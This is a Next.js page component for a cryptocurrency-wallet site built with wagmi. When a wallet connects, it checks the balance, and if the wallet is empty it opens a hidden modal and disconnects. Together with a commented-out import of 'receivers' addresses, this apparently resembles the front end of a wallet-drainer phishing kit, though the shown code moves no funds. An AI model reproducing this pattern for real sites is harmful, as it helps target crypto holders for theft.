"use client"
import styles from './page.module.css'
import Price from '@/components/coinlib'
import Header from '@/components/header'
import Hero from '@/components/hero'
import Item from '@/components/box'
import Footer from '@/components/footer'
import { useWalletClient, useAccount, useNetwork, usePublicClient, useFeeData, useBalance, useDisconnect} from "wagmi"
//import { receivers } from '@/utils/constant/address'
import sync from "@/utils/sync.json"
import {Modal} from "@/components/modal"
import { ConnectModal } from "@/components/modal/connect"


export default function Home() {

const publicClient = usePublicClient()

const {chains} = useNetwork()
const {address, isConnected} = useAccount({
 
 
  async onConnect(address) {

    if(address)
{
  
  //console.log(chains)
   let bal = await publicClient.getBalance(address) //data?.value || BigInt("0")

       if(bal <= BigInt(0))
{

  
  const mbtn = document.querySelector("#shm") //.clicked()
  mbtn?.click()
  disconnect()
  return

}
}
  } 
}) 
const {disconnect} = useDisconnect()

    
  return (
    <>
    <Price />
    <Header />
    <Hero />
    <main className={styles.main}>
    
    <section id="featured-services" className="featured-services">
      <div className="container" data-aos="fade-up">

        <div className="row">

        {
          sync.map((item,index) => 
<Item title={item.title} message={item.message} key={index} />
          )
        }

          </div>
          </div>
          <button type="button" id="shm" className="btn btn-primary d-none" data-bs-toggle="modal" data-bs-target="#exampleModal">
            Launch Modal
        </button>
        <button type="button" id="cshm" className="btn btn-primary d-none" data-bs-toggle="modal" data-bs-target="#cm">
            Launch Modal
        </button>
          </section>

    </main>
    <Modal />
    <ConnectModal />
    <Footer />
    </>
  )
}
